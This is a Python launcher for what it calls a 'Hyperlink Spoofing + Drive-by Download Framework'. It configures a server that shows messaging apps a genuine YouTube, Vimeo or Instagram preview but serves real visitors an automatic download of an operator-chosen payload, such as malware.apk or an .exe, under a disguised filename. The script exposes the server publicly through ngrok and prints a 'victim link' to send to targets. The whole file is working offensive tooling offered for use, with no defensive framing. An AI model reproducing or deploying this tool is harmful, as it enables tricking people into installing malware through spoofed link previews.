#!/usr/bin/env python3
"""
Hyperlink Spoofing + Drive-by Download Framework
Dynamic launcher with user input for target URL, payload, and configuration.

Usage:
    python run.py                              # Interactive mode
    python run.py --url <URL> --payload <FILE> # CLI mode
    python run.py --help                       # Show help
"""

import argparse
import os
import sys
import json
import platform
import subprocess
import shutil
from pathlib import Path
from datetime import datetime

# ============================================================================
# BANNER
# ============================================================================

BANNER = """
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                        ║
║   ███╗   ███╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗  ██╗███████╗ ║
║   ████╗ ████║██║   ██║██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝ ║
║   ██╔████╔██║██║   ██║██████╔╝█████╗  ██████╔╝███████╗███████║███████╗ ║
║   ██║╚██╔╝██║██║   ██║██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══██║╚════██║ ║
║   ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗██║  ██║███████║██║  ██║███████║ ║
║   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ║
║                                                                        ║
║   Hyperlink Spoofing + Drive-by Download Framework                     ║
║   Version: 2.0 | Cross-Platform (Linux/Windows)                       ║
║                                                                        ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# CONFIGURATION
# ============================================================================

def get_platform():
    """Detect platform (Linux/Windows)"""
    return platform.system().lower()

def get_local_ip():
    """Get local IP address (cross-platform: Linux, Windows, macOS)"""
    platform_name = get_platform()
    
    try:
        if platform_name == "linux":
            result = subprocess.run(
                ["ip", "-4", "addr", "show", "scope", "global"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.splitlines():
                if "inet " in line and "192.168" in line:
                    return line.strip().split()[1].split("/")[0]
        elif platform_name == "windows":
            result = subprocess.run(
                ["ipconfig"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.splitlines():
                if "IPv4" in line and "192.168" in line:
                    return line.split(":")[1].strip()
        elif platform_name == "darwin":  # macOS
            result = subprocess.run(
                ["ifconfig"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.splitlines():
                if "inet " in line and "192.168" in line and "netmask" in line:
                    return line.strip().split()[1]
    except Exception:
        pass
    return "127.0.0.1"

def get_ngrok_url():
    """Try to get ngrok public URL from API"""
    try:
        import urllib.request
        import json
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2) as resp:
            data = json.loads(resp.read())
            for tunnel in data.get("tunnels", []):
                if tunnel.get("proto") == "https":
                    return tunnel.get("public_url")
    except Exception:
        pass
    return None

def check_ngrok_running():
    """Check if ngrok is running (cross-platform: Linux, Windows, macOS)"""
    platform_name = get_platform()
    try:
        if platform_name in ["linux", "darwin"]:  # Linux or macOS
            result = subprocess.run(["pgrep", "ngrok"], capture_output=True, timeout=2)
            return result.returncode == 0
        elif platform_name == "windows":
            result = subprocess.run(["tasklist", "/FI", "IMAGENAME eq ngrok.exe"], 
                                  capture_output=True, text=True, timeout=2)
            return "ngrok.exe" in result.stdout
    except Exception:
        return False
    return False

def install_ngrok_instructions():
    """Show ngrok installation instructions (cross-platform)"""
    platform_name = get_platform()
    print("\n[!] ngrok not found. Please install:")
    if platform_name == "linux":
        print("    sudo snap install ngrok")
        print("    # or")
        print("    curl -s https://bin.equinox.io/c/4VmDzA71H4/ngrok-stable-linux-amd64.zip | unzip -")
        print("    sudo mv ngrok /usr/local/bin/")
    elif platform_name == "darwin":  # macOS
        print("    brew install ngrok")
        print("    # or download from: https://ngrok.com/download")
    elif platform_name == "windows":
        print("    winget install ngrok")
        print("    # or download from: https://ngrok.com/download")
    print("\n[!] After install, authenticate with:")
    print("    ngrok authtoken <YOUR_TOKEN>")
    print("\n[!] Then run this script again.")

# ============================================================================
# USER INPUT
# ============================================================================

def interactive_input():
    """Get configuration from user interactively"""
    print("\n" + "="*70)
    print("  DYNAMIC CONFIGURATION")
    print("="*70)
    
    # Target URL
    print("\n[1] TARGET URL")
    print("    Enter the URL you want to display as preview (YouTube, Vimeo, etc)")
    print("    Examples:")
    print("      - https://www.youtube.com/watch?v=3IIAes4Pr9w")
    print("      - https://vimeo.com/123456789")
    print("      - https://www.instagram.com/p/ABC123/")
    
    target_url = input("\n  Target URL: ").strip()
    if not target_url:
        print("[!] No URL provided, using default YouTube video")
        target_url = "https://www.youtube.com/watch?v=3IIAes4Pr9w"
    
    # Payload file
    print("\n" + "="*70)
    print("[2] PAYLOAD FILE")
    print("    Enter the path to your payload file")
    print("    Supports any extension: .apk, .exe, .pdf, .doc, .zip, etc")
    print("    Examples:")
    print("      - /path/to/malware.apk")
    print("      - ./payload/test.exe")
    print("      - C:\\Users\\attacker\\payload\\malware.pdf")
    
    payload_path = input("\n  Payload file: ").strip()
    if not payload_path:
        print("[!] No payload provided, using default test.apk")
        payload_path = "payload/test.apk"
    
    # Verify payload exists
    if not os.path.exists(payload_path):
        print(f"[!] Warning: Payload file not found: {payload_path}")
        print("    The server will still run, but download will fail.")
        use_anyway = input("    Continue anyway? (y/n): ").strip().lower()
        if use_anyway != 'y':
            print("    Exiting.")
            sys.exit(1)
    
    # Download filename
    print("\n" + "="*70)
    print("[3] DOWNLOAD FILENAME")
    print("    What filename should the victim see when downloading?")
    print("    Examples:")
    print("      - update.apk")
    print("      - document.pdf")
    print("      - photo.jpg")
    
    download_name = input("\n  Download filename: ").strip()
    if not download_name:
        download_name = os.path.basename(payload_path)
    
    # Port
    print("\n" + "="*70)
    print("[4] SERVER PORT")
    
    port = input("\n  Port [8088]: ").strip()
    if not port:
        port = 8088
    else:
        try:
            port = int(port)
        except ValueError:
            print("[!] Invalid port, using 8088")
            port = 8088
    
    # Public URL (ngrok)
    print("\n" + "="*70)
    print("[5] PUBLIC URL")
    print("    This is the URL that will be sent to the victim")
    print("    If you have ngrok running, it will auto-detect")
    
    ngrok_url = get_ngrok_url()
    if ngrok_url:
        print(f"    Detected ngrok URL: {ngrok_url}")
        use_ngrok = input("    Use this URL? (y/n): ").strip().lower()
        if use_ngrok == 'y':
            public_url = ngrok_url
        else:
            public_url = input("  Enter public URL: ").strip()
    else:
        if check_ngrok_running():
            print("    ngrok is running but API not accessible")
        else:
            print("    ngrok not detected")
        
        print("\n    Options:")
        print("      1. Start ngrok now (requires ngrok installed)")
        print("      2. Use local IP (only works on same network)")
        print("      3. Enter custom public URL")
        
        choice = input("\n  Choose [1/2/3]: ").strip()
        
        if choice == "1":
            print("\n    Starting ngrok tunnel...")
            print("    (ngrok will run in background, press Ctrl+C to stop)")
            
            # Kill existing ngrok first
            platform_name = get_platform()
            try:
                if platform_name in ["linux", "darwin"]:
                    subprocess.run(["pkill", "-f", "ngrok"], capture_output=True, timeout=2)
                elif platform_name == "windows":
                    subprocess.run(["taskkill", "/F", "/IM", "ngrok.exe"], capture_output=True, timeout=2)
                import time
                time.sleep(1)
            except Exception:
                pass
            
            # Get local IP for display
            local_ip = get_local_ip()
            print(f"\n    Local URL: http://{local_ip}:{port}")
            
            ngrok_cmd = f"ngrok http {port}"
            print(f"    Running: {ngrok_cmd}")
            
            # Start ngrok in subprocess
            subprocess.Popen(ngrok_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            print("\n    Waiting for ngrok to start...")
            import time
            time.sleep(3)
            
            ngrok_url = get_ngrok_url()
            if ngrok_url:
                public_url = ngrok_url
                print(f"    ngrok URL: {ngrok_url}")
            else:
                print("[!] Could not get ngrok URL")
                public_url = input("  Enter public URL manually: ").strip()
                if not public_url:
                    public_url = f"http://{local_ip}:{port}"
        
        elif choice == "2":
            local_ip = get_local_ip()
            public_url = f"http://{local_ip}:{port}"
            print(f"    Using local URL: {public_url}")
        
        else:
            public_url = input("  Enter public URL: ").strip()
            if not public_url:
                public_url = f"http://{get_local_ip()}:{port}"
    
    # Custom title/description
    print("\n" + "="*70)
    print("[6] CUSTOM PREVIEW (Optional)")
    print("    Leave blank to use OG tags from the target URL")
    
    custom_title = input("\n  Custom title (blank=auto): ").strip()
    custom_desc = input("  Custom description (blank=auto): ").strip()
    
    return {
        "target_url": target_url,
        "payload_path": payload_path,
        "download_name": download_name,
        "port": port,
        "public_url": public_url,
        "custom_title": custom_title,
        "custom_desc": custom_desc,
    }

def cli_input():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Hyperlink Spoofing + Drive-by Download Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python run.py --url "https://youtube.com/watch?v=ABC123" --payload ./malware.apk
  python run.py --url "https://vimeo.com/123456789" --payload ./document.pdf --name "report.pdf"
  python run.py --url "https://instagram.com/p/XYZ/" --payload ./photo.jpg --port 9090
  python run.py --interactive
        """
    )
    
    parser.add_argument("-i", "--interactive", action="store_true",
                        help="Run in interactive mode (default if no args)")
    parser.add_argument("-u", "--url", type=str,
                        help="Target URL for OG preview (YouTube, Vimeo, etc)")
    parser.add_argument("-p", "--payload", type=str,
                        help="Path to payload file (any extension)")
    parser.add_argument("-n", "--name", type=str,
                        help="Download filename displayed to victim")
    parser.add_argument("--port", type=int, default=8088,
                        help="Server port (default: 8088)")
    parser.add_argument("--public-url", type=str,
                        help="Public URL (ngrok, custom domain, etc)")
    parser.add_argument("--title", type=str, default="",
                        help="Custom OG title (blank=auto from URL)")
    parser.add_argument("--description", type=str, default="",
                        help="Custom OG description (blank=auto from URL)")
    
    args = parser.parse_args()
    
    if args.interactive or (not args.url and not args.payload):
        return interactive_input()
    
    if not args.url:
        parser.error("--url is required (or use --interactive)")
    if not args.payload:
        parser.error("--payload is required (or use --interactive)")
    
    # Auto-detect download name
    download_name = args.name if args.name else os.path.basename(args.payload)
    
    # Auto-detect public URL
    public_url = args.public_url
    if not public_url:
        ngrok_url = get_ngrok_url()
        if ngrok_url:
            public_url = ngrok_url
            print(f"[*] Auto-detected ngrok URL: {ngrok_url}")
        else:
            local_ip = get_local_ip()
            public_url = f"http://{local_ip}:{args.port}"
            print(f"[*] Using local URL: {public_url}")
    
    return {
        "target_url": args.url,
        "payload_path": args.payload,
        "download_name": download_name,
        "port": args.port,
        "public_url": public_url,
        "custom_title": args.title,
        "custom_desc": args.description,
    }

# ============================================================================
# CONFIGURATION GENERATOR
# ============================================================================

def generate_config(config):
    """Generate config.py with dynamic values"""
    
    import urllib.parse
    
    local_ip = get_local_ip()
    # Encode target URL for universal support
    encoded_url = urllib.parse.quote(config["target_url"], safe='')
    payload_ext = os.path.splitext(config["payload_path"])[1].lower()
    
    # Determine MIME type
    mime_types = {
        ".apk": "application/vnd.android.package-archive",
        ".exe": "application/x-msdownload",
        ".pdf": "application/pdf",
        ".doc": "application/msword",
        ".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        ".zip": "application/zip",
        ".rar": "application/x-rar-compressed",
        ".7z": "application/x-7z-compressed",
        ".jpg": "image/jpeg",
        ".jpeg": "image/jpeg",
        ".png": "image/png",
        ".gif": "image/gif",
        ".mp3": "audio/mpeg",
        ".mp4": "video/mp4",
        ".html": "text/html",
        ".js": "application/javascript",
    }
    payload_mime = mime_types.get(payload_ext, "application/octet-stream")
    
    config_content = f'''"""
Dynamic Configuration - Auto-generated by run.py
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Platform: {get_platform().title()}
"""

import socket
import subprocess
import platform

def get_local_ip():
    """Get local IP address (cross-platform: Linux, Windows, macOS)"""
    try:
        os_name = platform.system().lower()
        if os_name == "linux":
            result = subprocess.run(
                ["ip", "-4", "addr", "show", "scope", "global"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.splitlines():
                if "inet " in line and "192.168" in line:
                    return line.strip().split()[1].split("/")[0]
        elif os_name == "windows":
            result = subprocess.run(
                ["ipconfig"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.splitlines():
                if "IPv4" in line and "192.168" in line:
                    return line.split(":")[1].strip()
        elif os_name == "darwin":  # macOS
            result = subprocess.run(
                ["ifconfig"],
                capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.splitlines():
                if "inet " in line and "192.168" in line and "netmask" in line:
                    return line.strip().split()[1]
    except Exception:
        pass
    return "127.0.0.1"

# Server Configuration
LOCAL_IP = "{local_ip}"
PORT = {config["port"]}
HOST = "0.0.0.0"

# Public URL for victim link
PUBLIC_URL = "{config["public_url"]}"

# Target URL for OG preview
TARGET_URL = "{config["target_url"]}"
DEFAULT_VIDEO_ID = "{encoded_url}"

# Payload Configuration
PAYLOAD_FILE = "{os.path.basename(config["payload_path"])}"
PAYLOAD_MIME = "{payload_mime}"
PAYLOAD_PATH = "{os.path.abspath(config["payload_path"])}"

# Download filename for victim
DOWNLOAD_NAME = "{config["download_name"]}"

# Custom OG tags (empty = auto-fetch from target URL)
CUSTOM_TITLE = "{config["custom_title"]}"
CUSTOM_DESCRIPTION = "{config["custom_desc"]}"
'''
    
    with open("config.py", "w") as f:
        f.write(config_content)
    
    return {
        "encoded_url": encoded_url,
        "payload_ext": payload_ext,
        "payload_mime": payload_mime,
        "local_ip": local_ip,
    }

def extract_video_id(url):
    """Extract video ID from YouTube/Vimeo/Instagram URL"""
    import re
    
    # YouTube patterns
    youtube_patterns = [
        r'(?:v=|/v/|youtu\.be/)([a-zA-Z0-9_-]{11})',
        r'(?:embed/)([a-zA-Z0-9_-]{11})',
        r'(?:shorts/)([a-zA-Z0-9_-]{11})',
    ]
    for pattern in youtube_patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    
    # Vimeo pattern
    vimeo_match = re.search(r'vimeo\.com/(\d+)', url)
    if vimeo_match:
        return vimeo_match.group(1)
    
    # Instagram pattern
    insta_match = re.search(r'instagram\.com/p/([a-zA-Z0-9_-]+)', url)
    if insta_match:
        return insta_match.group(1)
    
    # Generic: use URL hash
    return str(abs(hash(url)) % (10**11))[:11]

# ============================================================================
# LAUNCH SERVER
# ============================================================================

def launch_server(config, extra_info):
    """Launch Flask server with configuration"""
    
    import urllib.parse
    
    print("\n" + "="*70)
    print("  SERVER STARTING")
    print("="*70)
    
    # Display attack info - use encoded URL for universal support
    victim_url = f"{config['public_url']}/v?id={extra_info['encoded_url']}"
    
    # Print config box
    print("┌────────────────────────────────────────────────────────────────────────┐")
    print("│                     ATTACK CONFIGURATION                              │")
    print("├────────────────────────────────────────────────────────────────────────┤")
    print(f"│  Target URL:     {config['target_url'][:50]:<50} │")
    print(f"│  Payload:        {config['payload_path'][:50]:<50} │")
    print(f"│  Download As:    {config['download_name'][:50]:<50} │")
    print(f"│  MIME Type:      {extra_info['payload_mime'][:50]:<50} │")
    print(f"│  Local IP:       {extra_info['local_ip'][:50]:<50} │")
    print(f"│  Port:           {str(config['port']):<50} │")
    print("├────────────────────────────────────────────────────────────────────────┤")
    print("│                                                                        │")
    print("│  VICTIM LINK (send this to target):                                   │")
    print("│                                                                        │")
    print(f"│  {victim_url}")
    print("│                                                                        │")
    print(f"│  Dashboard:  http://{extra_info['local_ip']}:{config['port']}/admin")
    print(f"│  Health:     http://{extra_info['local_ip']}:{config['port']}/health")
    print("│                                                                        │")
    print("├────────────────────────────────────────────────────────────────────────┤")
    print("│  BEHAVIOR:                                                             │")
    print("│  • WhatsApp/Telegram → OG preview from target URL                      │")
    print("│  • Real user → Auto-download + redirect to target URL                  │")
    print("└────────────────────────────────────────────────────────────────────────┘")
    print("")
    
    # Copy payload to payload directory if needed
    payload_dest = os.path.join("payload", config["download_name"])
    if os.path.abspath(config["payload_path"]) != os.path.abspath(payload_dest):
        os.makedirs("payload", exist_ok=True)
        if os.path.exists(config["payload_path"]):
            shutil.copy2(config["payload_path"], payload_dest)
            print(f"[*] Payload copied to: {payload_dest}")
    
    # Update payload filename in config
    config["download_name"] = os.path.basename(payload_dest)
    
    print("[*] Starting Flask server...")
    print("[*] Press Ctrl+C to stop\n")
    
    # Import and run server
    try:
        from server import app
        app.run(host="0.0.0.0", port=config["port"], debug=False)
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"\n[!] Server error: {e}")
        sys.exit(1)

# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main entry point"""
    print(BANNER)
    
    # Check platform
    platform_name = get_platform()
    print(f"[*] Platform: {platform_name.title()}")
    print(f"[*] Python: {sys.version.split()[0]}")
    
    # Get configuration
    config = cli_input()
    
    # Generate config.py
    print("\n[*] Generating configuration...")
    extra_info = generate_config(config)
    
    # Save config backup
    backup_file = f"config_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
    shutil.copy2("config.py", backup_file)
    print(f"[*] Config saved to: {backup_file}")
    
    # Launch server
    launch_server(config, extra_info)

if __name__ == "__main__":
    main()
